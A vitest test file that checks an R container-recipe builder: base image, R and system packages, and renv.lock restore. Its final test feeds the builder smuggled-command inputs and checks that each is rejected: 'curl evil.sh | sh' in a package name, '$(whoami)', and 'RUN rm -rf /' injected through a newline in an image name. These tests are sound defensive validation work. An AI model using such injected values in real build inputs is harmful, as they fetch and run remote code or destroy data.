// The R engine's container recipe: R with the driver's packages, plus what the
// workspace asks for, with names that cannot smuggle in commands.
import { describe, expect, it } from 'vitest';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DEFAULT_IMAGE, imageRecipe } from '../src/index.js';

const ws = () => mkdtempSync(join(tmpdir(), 'kuraa-recipe-'));

describe('R image recipe', () => {
  it('starts from rocker/r-ver and installs the driver packages', () => {
    const { containerfile, context } = imageRecipe(undefined, ws());
    expect(containerfile).toContain(`FROM ${DEFAULT_IMAGE}\n`);
    expect(containerfile).toContain('RUN install2.r --error --skipinstalled evaluate jsonlite knitr ragg\n');
    expect(context).toEqual({});
  });

  it('adds the packages, system libraries and image the workspace asks for', () => {
    const { containerfile } = imageRecipe({ image: 'docker.io/rocker/r-ver:4.4.2', packages: ['dplyr', 'data.table'], system: ['libxml2-dev'] }, ws());
    expect(containerfile).toContain('FROM docker.io/rocker/r-ver:4.4.2\n');
    expect(containerfile).toContain('evaluate jsonlite knitr ragg dplyr data.table');
    expect(containerfile).toContain('libwebp-dev libxml2-dev');
  });

  it('restores renv.lock when asked and present', () => {
    const dir = ws();
    expect(imageRecipe({ renv: true }, dir).containerfile).not.toContain('renv');
    writeFileSync(join(dir, 'renv.lock'), '{}');
    const { containerfile, context } = imageRecipe({ renv: true }, dir);
    expect(containerfile).toContain('COPY renv.lock /tmp/renv.lock');
    expect(containerfile).toContain('renv::restore(lockfile = "/tmp/renv.lock"');
    expect(Object.keys(context!)).toEqual(['renv.lock']);
  });

  it('refuses names that are not plain package names', () => {
    expect(() => imageRecipe({ packages: ['dplyr; curl evil.sh | sh'] }, ws())).toThrow('r.packages must be a list of plain package names');
    expect(() => imageRecipe({ system: ['$(whoami)'] }, ws())).toThrow('r.system must be a list of plain package names');
    expect(() => imageRecipe({ image: 'x\nRUN rm -rf /' }, ws())).toThrow('r.image is not an image name');
  });
});
